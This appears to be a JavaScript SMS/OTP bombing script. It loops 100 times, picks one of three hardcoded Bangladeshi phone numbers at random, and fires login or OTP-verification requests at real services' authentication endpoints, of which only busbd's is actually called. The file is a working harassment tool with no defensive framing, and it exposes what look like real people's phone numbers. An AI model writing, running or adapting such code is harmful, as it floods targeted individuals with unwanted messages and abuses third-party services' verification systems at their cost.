const len = 100;
for (let i = 0; i < len; i++) {
    const array = ['01844998030','01551775055','01518674817'];
    const random = Math.floor(Math.random() * array.length);
    const phone = array[random];

    function busbd() {
        const phoneNumber = `+88${phone}`;
        const url = "https://api.busbd.com.bd/api/auth";

        const data = {
            phone: phoneNumber
        };

        const options = {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        };

        fetch(url, options)
            .then(res => res.json())
            .then(data => console.log(data))
    }

    function backoffice() {
        const URL = `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`;
        const options = {
            method: "GET",
        }

        fetch(URL, options)
            .then(res => res.json())
            .then(data => console.log(data))
    }

    function bikroy() {
        const URL = `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`;
        const options = {
            method: "GET"
        }

        fetch(URL, options)
            .then(res => res.json())
            .then(data => console.log(data))
    }



    const apiFunction = [busbd]
    const RandomApi = Math.floor(Math.random() * apiFunction.length)
    const Capi = apiFunction[RandomApi]
    const result = Capi();
}

